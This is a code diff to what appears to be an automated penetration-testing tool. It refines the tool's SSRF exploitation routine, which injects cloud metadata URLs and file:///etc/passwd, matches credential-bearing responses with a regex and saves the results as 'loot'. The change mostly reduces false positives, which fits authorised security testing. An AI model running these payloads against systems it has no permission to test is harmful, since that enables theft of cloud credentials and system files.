@@ -18,7 +18,7 @@ from __future__ import annotations
 
 import importlib
 import re
-from urllib.parse import urlparse
+from urllib.parse import unquote, urlparse
 
 from loguru import logger
 
@@ -63,6 +63,11 @@ _SSRF_TARGETS = [
     "http://169.254.169.254/metadata/instance?api-version=2021-02-01",  # Azure
     "file:///etc/passwd",
 ]
+# Content only a real fetched metadata/file response contains — NOT substrings of the
+# payload (so a reflected URL never matches) and NOT generic words like "instance".
+_SSRF_CONTENT_RE = re.compile(
+    r"ami-id|instance-id|iam/security-credentials|public-keys/|local-ipv4|reservation-id|"
+    r"service-accounts/|numeric-project-id|compute/v1/|root:.*?:0:0:", re.I)
 
 
 # ---------------------------------------------------------------------------
@@ -130,12 +135,14 @@ def _exploit_lfi(inj: Injector, loot) -> Finding | None:
 def _exploit_ssrf(inj: Injector, loot) -> Finding | None:
     for target in _SSRF_TARGETS:
         resp = inj.inject(target)
-        if resp is None or resp.status_code >= 400 or len(resp.text.strip()) < 3:
+        if resp is None or resp.status_code >= 400:
             continue
-        body = resp.text.strip()
-        # Heuristic: a metadata/file response that differs from a normal page.
-        if not any(k in body.lower() for k in ("ami-", "instance", "iam", "computemetadata",
-                                               "root:", "meta-data", "hostname", "compute")):
+        # Strip our reflected payload, then require real fetched-metadata/file content.
+        body = unquote(resp.text).replace(target, "").replace(unquote(target), "")
+        low = body.lower()
+        if "<html" in low or "<!doctype" in low:   # a reflected HTML page is NOT SSRF
+            continue
+        if not _SSRF_CONTENT_RE.search(body):
             continue
         proof = inj.proof(target) if inj.proof else ""
         evidence = _save_evidence(loot, f"ssrf_{inj.param}.txt", body[:4000])
